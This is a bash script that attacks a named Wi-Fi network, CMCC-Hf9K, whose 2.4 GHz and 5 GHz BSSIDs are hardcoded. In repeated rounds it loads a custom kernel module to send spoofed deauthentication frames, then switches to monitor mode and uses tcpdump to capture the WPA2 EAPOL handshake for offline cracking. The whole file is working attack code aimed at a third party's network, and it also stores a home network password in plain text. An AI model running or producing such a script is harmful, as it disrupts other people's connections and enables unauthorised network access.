#!/bin/bash
# capture_cmcc.sh - Deauth CMCC-Hf9K and capture WPA2 handshake
#
# Strategy:
# 1. Connect to CMCC-Hf9K (dummy pw, gets 802.11 association only)
# 2. Fire spoofed deauths via petx5 (SA=BSSID, DA=broadcast)
# 3. Switch to monitor mode on same channel
# 4. Capture EAPOL frames as clients reconnect
# 5. Repeat until handshake captured
#
# Usage: sudo bash /tmp/capture_cmcc.sh [rounds]

ROUNDS=${1:-10}
BURST=5
TARGET_BSSID_24="86:1A:24:58:59:1C"
TARGET_BSSID_24_LC="86:1a:24:58:59:1c"
TARGET_BSSID_5G="86:1A:24:5C:59:1C"
TARGET_BSSID_5G_LC="86:1a:24:5c:59:1c"
HOME_BSSID="8C:DE:F9:B3:9E:20"
HOME_PSK="9006609b29404a"
PCAP="/tmp/cmcc_hs.pcap"
CAPTURE_SECONDS=8

echo "[*] CMCC-Hf9K handshake capture - $ROUNDS rounds"
echo "[*] Target 2.4G: $TARGET_BSSID_24_LC (ch11/2462MHz)"
echo "[*] Target 5G:   $TARGET_BSSID_5G_LC (ch44/5220MHz)"

cd /tmp

# Build petx5 if needed
if [ ! -f petx5.ko ] || [ petx5.S -nt petx5.ko ]; then
    echo "[*] Building petx5.ko..."
    as -o petx5.o petx5.S && ld -r -o petx5.ko petx5.o || { echo "BUILD FAIL"; exit 1; }
fi

# Remove old capture
rm -f "$PCAP"

TOTAL_DEAUTH=0
GOT_HANDSHAKE=0

for round in $(seq 1 $ROUNDS); do
    echo ""
    echo "[Round $round/$ROUNDS] === DEAUTH PHASE ==="

    # Ensure managed mode
    ip link set wlan0 down 2>/dev/null
    iw dev wlan0 set type managed 2>/dev/null
    ip link set wlan0 up 2>/dev/null
    sleep 0.5

    # Disconnect current
    nmcli device disconnect wlan0 2>/dev/null
    sleep 0.3

    # Mark dmesg
    CONN_BEFORE=$(dmesg | grep -c "connected to 86:1a:24:5[8c]:59:1c")

    # Connect to CMCC-Hf9K (try 2.4GHz BSSID)
    nmcli device wifi connect "$TARGET_BSSID_24" password "dummypassword12345678" ifname wlan0 2>/dev/null &
    PID=$!

    # Wait for connection (either band)
    OK=0
    CONNECTED_BSSID=""
    for i in $(seq 1 80); do
        CONN_NOW=$(dmesg | grep -c "connected to 86:1a:24:5[8c]:59:1c")
        if [ "$CONN_NOW" -gt "$CONN_BEFORE" ]; then
            # Determine which BSSID
            LAST_LINE=$(dmesg | grep "connected to 86:1a:24:5" | tail -1)
            if echo "$LAST_LINE" | grep -q "58:59:1c"; then
                CONNECTED_BSSID="24"
                echo "  Connected to 2.4GHz (ch11)"
            else
                CONNECTED_BSSID="5G"
                echo "  Connected to 5GHz (ch44)"
            fi
            OK=1
            break
        fi
        sleep 0.05
    done

    if [ $OK -eq 0 ]; then
        echo "  FAIL (no connect)"
        kill $PID 2>/dev/null; wait $PID 2>/dev/null
        # Try restore managed
        ip link set wlan0 down 2>/dev/null
        iw dev wlan0 set type managed 2>/dev/null
        ip link set wlan0 up 2>/dev/null
        nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
        sleep 2
        continue
    fi

    # Fire deauth burst
    SENT=0
    for b in $(seq 1 $BURST); do
        rmmod kfind 2>/dev/null
        sleep 0.03
        insmod /tmp/petx5.ko 2>/dev/null
        if [ $? -eq 0 ]; then
            TOTAL_DEAUTH=$((TOTAL_DEAUTH + 1))
            SENT=$((SENT + 1))
            rmmod kfind 2>/dev/null
            sleep 0.08
        else
            break
        fi
    done
    echo "  Sent $SENT deauths (total=$TOTAL_DEAUTH)"

    # Kill nmcli
    kill $PID 2>/dev/null; wait $PID 2>/dev/null

    # Cleanup NM profiles
    for prof in $(nmcli -t -f NAME connection show | grep -v "9899" | grep -v "lo" | grep -v "waydroid" | grep -v "bridge"); do
        nmcli connection delete "$prof" 2>/dev/null
    done

    echo "[Round $round/$ROUNDS] === CAPTURE PHASE ==="

    # Switch to monitor mode
    nmcli device disconnect wlan0 2>/dev/null
    ip link set wlan0 down
    iw dev wlan0 set type monitor
    ip link set wlan0 up

    # Set channel based on which BSSID we connected to
    if [ "$CONNECTED_BSSID" = "24" ]; then
        iw dev wlan0 set freq 2462
        echo "  Monitor on ch11/2462MHz"
        CAP_BSSID="$TARGET_BSSID_24_LC"
    else
        iw dev wlan0 set freq 5220
        echo "  Monitor on ch44/5220MHz"
        CAP_BSSID="$TARGET_BSSID_5G_LC"
    fi

    # Capture EAPOL frames (ether proto 0x888e) for N seconds
    # Also capture beacons from target for association tracking
    echo "  Capturing for ${CAPTURE_SECONDS}s..."
    timeout $CAPTURE_SECONDS tcpdump -i wlan0 -w "${PCAP}.part${round}" \
        '(ether proto 0x888e) or (type mgt subtype deauth) or (type mgt subtype auth) or (type mgt subtype assoc-req) or (type mgt subtype assoc-resp)' \
        2>/dev/null &
    CAP_PID=$!
    sleep $CAPTURE_SECONDS
    kill $CAP_PID 2>/dev/null; wait $CAP_PID 2>/dev/null

    # Check what we captured
    EAPOL_COUNT=$(tcpdump -r "${PCAP}.part${round}" 'ether proto 0x888e' 2>/dev/null | wc -l)
    echo "  Captured $EAPOL_COUNT EAPOL frames"

    # Merge partial captures
    if [ -f "$PCAP" ]; then
        mergecap -w "${PCAP}.merged" "$PCAP" "${PCAP}.part${round}" 2>/dev/null
        if [ -f "${PCAP}.merged" ]; then
            mv "${PCAP}.merged" "$PCAP"
        else
            # No mergecap - just append by keeping both and concat later
            cat "${PCAP}.part${round}" >> "${PCAP}.parts" 2>/dev/null
        fi
    else
        cp "${PCAP}.part${round}" "$PCAP"
    fi

    # Quick check for handshake
    if [ $EAPOL_COUNT -ge 4 ]; then
        echo "  *** Possible complete handshake! ***"
        GOT_HANDSHAKE=1
    fi

    # Restore managed mode
    ip link set wlan0 down
    iw dev wlan0 set type managed
    ip link set wlan0 up
    sleep 1

    # Reconnect home
    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    sleep 2

    if [ $GOT_HANDSHAKE -eq 1 ] && [ $EAPOL_COUNT -ge 8 ]; then
        echo "[*] Got enough EAPOL frames, stopping early"
        break
    fi
done

echo ""
echo "[*] === RESULTS ==="
echo "[*] $TOTAL_DEAUTH deauths sent in $ROUNDS rounds"
echo "[*] Capture file: $PCAP"

# Final analysis
if [ -f "$PCAP" ]; then
    TOTAL_EAPOL=$(tcpdump -r "$PCAP" 'ether proto 0x888e' 2>/dev/null | wc -l)
    echo "[*] Total EAPOL frames: $TOTAL_EAPOL"
    echo "[*] EAPOL details:"
    tcpdump -r "$PCAP" -e 'ether proto 0x888e' 2>/dev/null | head -20
fi
echo "[*] Done."
